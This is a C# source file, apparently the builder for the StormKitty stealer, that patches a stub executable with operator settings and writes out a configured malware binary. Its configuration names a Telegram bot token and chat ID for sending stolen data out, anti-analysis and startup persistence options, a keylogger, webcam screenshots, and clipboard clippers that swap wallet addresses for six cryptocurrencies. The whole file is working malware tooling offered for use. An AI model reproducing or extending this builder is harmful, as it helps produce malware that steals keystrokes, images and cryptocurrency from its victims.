/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using Mono.Cecil;
using Mono.Cecil.Cil;

using System;
using System.Linq;
using System.Collections.Generic;

namespace StormKittyBuilder
{
    internal sealed class build
    {
        private static Random random = new Random();

        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static Dictionary<string, string> ConfigValues = new Dictionary<string, string>
        {
            { "Telegram API", "" },
            { "Telegram ID", "" },

            { "AntiAnalysis", "" },
            { "Startup", "" },
            { "StartDelay", "" },

            { "ClipperBTC", "" },
            { "ClipperETH", "" },
            { "ClipperXMR", "" },
            { "ClipperXRP", "" },
            { "ClipperLTC", "" },
            { "ClipperBCH", "" },

            { "WebcamScreenshot", "" },
            { "Keylogger", "" },
            { "Clipper", "" },

            { "Mutex", RandomString(20) },
        };


        // Read stub
        private static AssemblyDefinition ReadStub()
        {
            return AssemblyDefinition.ReadAssembly("stub\\stub.exe");
        }

        // Write stub
        private static void WriteStub(AssemblyDefinition definition, string filename)
        {
            definition.Write(filename);
        }

        // Replace values in config
        private static string ReplaceConfigParams(string value)
        {
            foreach (KeyValuePair<string, string> config in ConfigValues)
                if (value.Equals($"--- {config.Key} ---"))
                    return config.Value;
                
            return value;
        }

        // Проходим по всем классам, строкам и заменяем значения.
        public static AssemblyDefinition IterValues(AssemblyDefinition definition)
        {
            foreach (ModuleDefinition definition2 in definition.Modules)
                foreach (TypeDefinition definition3 in definition2.Types)
                    if (definition3.Name.Equals("Config"))
                        foreach (MethodDefinition definition4 in definition3.Methods)
                            if (definition4.IsConstructor && definition4.HasBody)
                            {
                                IEnumerator<Instruction> enumerator;
                                enumerator = definition4.Body.Instructions.GetEnumerator();
                                while (enumerator.MoveNext())
                                {
                                    var current = enumerator.Current;
                                    if (current.OpCode.Code == Code.Ldstr & current.Operand is object)
                                    {
                                        string str = current.Operand.ToString();
                                        if (str.StartsWith("---") && str.EndsWith("---"))
                                            current.Operand = ReplaceConfigParams(str);
                                    }
                                }

                            }

            return definition;
        }

        // Read stub && compile
        public static string BuildStub()
        {
            var definition = ReadStub();
            definition = IterValues(definition);
            WriteStub(definition, "stub\\build.exe");
            return "stub\\build.exe";
        }

    }
}
